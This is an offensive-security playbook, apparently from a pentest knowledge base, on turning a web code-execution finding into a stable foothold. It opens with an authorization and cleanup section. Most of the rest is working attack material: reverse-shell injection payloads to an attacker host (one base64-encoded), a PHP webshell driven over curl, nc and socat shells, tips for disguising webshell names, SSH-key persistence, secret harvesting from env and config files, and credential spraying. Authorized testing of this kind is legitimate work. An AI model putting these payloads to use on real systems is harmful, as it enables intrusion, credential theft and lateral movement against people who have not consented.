# Moraa — Initial Access (web finding → foothold)

> The bridge between the web track and the internal track. `[[rce-scenarios]]` gets you code
> execution *proof*; this doc turns the primitive into a usable, stable position — and says when
> you are allowed to. Cross-ref [[file-upload]] (shell upload), [[command-injection]] (the sink
> that fired), [[pivoting]] (the tunnel you set up IMMEDIATELY after landing), [[privesc-linux]],
> [[privesc-windows]] (what comes next), [[credential-access]] (harvest + reuse).

## 0. The authorization gate — read before firing a single payload

**Bug bounty:** the finding is the RCE *proof*, not the shell. Stop at `id`/`whoami`/
`hostname`/one file read (e.g. `/etc/passwd` header lines), screenshot it, and report. Dropping a
webshell, pivoting, or touching anything past the compromised app is out of scope without
explicit program permission — doing it anyway is how bounties become legal problems.

**Pentest / CPTS / red team with written scope:** proceed. Land, stabilize, pivot
([[pivoting]] — set the tunnel up BEFORE going deeper), privesc, move.

When in doubt, ask the program in writing and keep the answer with the engagement docs.

## 1. Primitive → shell: the four routes in

### Route A — command injection → reverse shell
```bash
# confirmed sink (see command-injection.md for blind confirmation FIRST):
# time-based proof already done → now the shell (reverse, listener ready BEFORE firing)
#   attacker:  rlwrap -cAr nc -lvnp 443
127.0.0.1;bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/443 >&2 0>&1'
# filtered? base64 the whole payload and decode in-line:
127.0.0.1;echo YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC80NDMgPiYyIDA+JjE=|base64 -d|bash
```
Full per-language one-liners + TTY upgrade: [[payloads/reverse-shells]].

### Route B — file upload → webshell → shell
```bash
# upload a minimal shell (see file-upload.md for bypassing extension/MIME filters):
echo '<?php system($_GET["c"]); ?>' > upload.php
# confirm execution, then drive a reverse shell through it:
curl -s "https://TARGET/uploads/upload.php?c=id"
curl -s "https://TARGET/uploads/upload.php?c=bash%20-c%20%27bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/443%20%3E%262%200%3E%261%27"
```
Know where the file LANDED before scripting against it — response URL, guessed path fuzz, or a
path-disclosure error. A shell at a URL you can't hit is decoration.

### Route C — deserialization → RCE → shell
`ysoserial`/`phpggc`-generated payloads (see [[deserialization]]) usually give blind command
execution; same play as Route A — blind-confirm with time/OOB first, then run the reverse-shell
one-liner as the command string.

### Route D — SSRF → internal service → foothold
SSRF alone is not a shell. It becomes one when it reaches something that executes or hands over
creds: cloud metadata (`169.254.169.254` → IAM keys → console/programmatic access, [[ssrf]] +
[[cloud]]), `gopher://` into an internal Redis/SMTP service, or an exposed internal admin panel
whose actions shell out. Chain discipline: [[business-logic]]/[[rce-scenarios]] A→B.

## 2. Webshell placement (authorized engagements only)

```bash
# principles, not a menu — each choice is a trade between reach and noise:
#   - drop it in an app-writable path the web server SERVES (uploads/, /tmp is useless without LFI)
#   - name it like the neighbours (cookie-consent.php, health.js.aspx) — not shell.php
#   - minimal content, no backdoor keyword strings (grep-bait like "cmd", "eval" trimmed where possible)
#   - if the app writes logs of file contents/names, assume the shell is noticed at some point
```
**Cleanup is mandatory and authorized-scope-only:** delete every dropped file at engagement end,
record each path in the engagement notes so nothing is "cleaned" by forgetting it, and note in
the report exactly what lived where and when. Do not establish persistence (`active-directory.md`
§ Persistence & cleanup is
for engagements that explicitly authorize it).

## 3. Reverse vs bind vs forward — pick by reachability, not preference

| Direction | When it works | Command shape |
|---|---|---|
| **Reverse** (default — victim connects OUT to you) | target has any egress (80/443/53 almost always do) | listener on your side first: `rlwrap -cAr nc -lvnp 443` |
| **Bind** (you connect IN to a listener on the victim) | you can route to the victim on some port; internal pivoted networks often qualify | `nc -lvnp 443 -e /bin/bash` on victim, connect from your side |
| **Forward** (relay/port-forward through the box) | neither direct direction works, but the box has a NIC into where you need to be | that is not a shell any more — that is [[pivoting]]: ligolo-ng agent out to you, route added, done |

Golden rule (same as [[pivoting]]): **prefer reverse** — never depend on the target's inbound
firewall. If egress is filtered too, escalate through what IS reachable (ICMP/DNS-tunnel shells,
or a forward proxy via an allowed service) — and say plainly in notes which direction worked.

## 4. Getting a stable session (10 seconds of work, saves hours)

```bash
# 1. TTY upgrade (Linux, python available) — full walkthrough in payloads/reverse-shells.md:
python3 -c 'import pty,os;os.execv("/bin/bash",["bash","-pi"])'   # then Ctrl-Z:
stty raw -echo; fg; export TERM=xterm-256color; stty rows 40 cols 120
# 2. or serve a full interactive shell directly:
#   attacker: socat FILE:`tty`,raw,echo=0 TCP-LISTEN:443
#   victim:   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:ATTACKER_IP:443
# 3. once privesc'd / creds found: drop to real SSH (stable, encrypted, survives reboots of your listener):
#   echo your pubkey >> ~/.ssh/authorized_keys   (record this in engagement notes for cleanup)
```

## 5. FIRST 10 MINUTES ON LANDING — situational awareness before noise

Every command here is quiet; none of it is exploit spray. Order matters — know the box before
you shake it.

```bash
id; hostname; uname -a; cat /etc/os-release 2>/dev/null          # who am I, what box
ip a; ip route                                                    # second NIC? → PIVOT NOW (pivoting.md)
sudo -ln 2>/dev/null                                              # privesc shortcuts (privesc-linux.md)
ps aux | head -30; ss -tlnp 2>/dev/null || netstat -tlnp          # what runs here, what's local-only
ls -la /opt /srv /var/www 2>/dev/null                             # the app you came through — its config lives nearby
env | grep -iE 'key|token|secret|pass|aws|api'                    # creds in env (redact before any write-up)
crontab -l 2>/dev/null; ls -la /etc/cron* 2>/dev/null
```
Windows equivalent (`whoami /priv`, `winPEAS`, SeImpersonate checks): [[privesc-windows]].
Internal recon (what can this box see): start `nxc smb <subnet>` — [[active-directory]].

**Then, before anything else: stand up the pivot** ([[pivoting]] — ligolo-ng agent → route add).
Standing rule: never tunnel-blind, and never enumerate a second subnet through a shell when a
tunneled interface is five minutes away.

## 6. Credential reuse — web tier → internal estate

The web box holds DB creds, SMTP creds, API keys, and config secrets. These are *passwords
somewhere else* until proven otherwise:

```bash
# harvest (web-tier config is the goldmine):
grep -riE 'password|secret|api_key|connectionstring' /var/www /opt /etc/<app> 2>/dev/null | head -40
#   config files: .env, wp-config.php, web.config, application.yml, settings.py, docker-compose.yml
# then try them ONE tier over — DB first (they usually open it), then admin services:
mysql -h INTERNAL_DB -u <user> -p'<pass>' -e 'select 1;' 2>&1 | head -3
# reuse vs the estate (spray discipline + rules-of-engagement: credential-access.md):
nxc smb INTERNAL_SUBNET/24 -u <user> -p '<pass>' --continue-on-success | grep -v Status
```

**Impact gate:** reuse counts when the SAME credential opens a different, more privileged door —
DB with customer data, internal admin panel, another server's SSH. "The config contains a
password" is a note; "that password is DBA / domain-admin / another host's root" is the finding.
Spray rules and legality: [[credential-access]].

## 7. Impact gate for the whole doc

- **Bug bounty finding:** code execution *proven* on an in-scope host (command output or file
  read in evidence), impact stated in what an attacker does next. The shell itself is a means,
  not the finding.
- **Pentest finding:** foothold → pivot → privesc → lateral chain, each hop evidenced — that
  chain is what the report sells, and [[validate]] + [[reporting]] gate it.
- Always: scope check before Route A-D, cleanup log maintained, no persistence beyond scope.
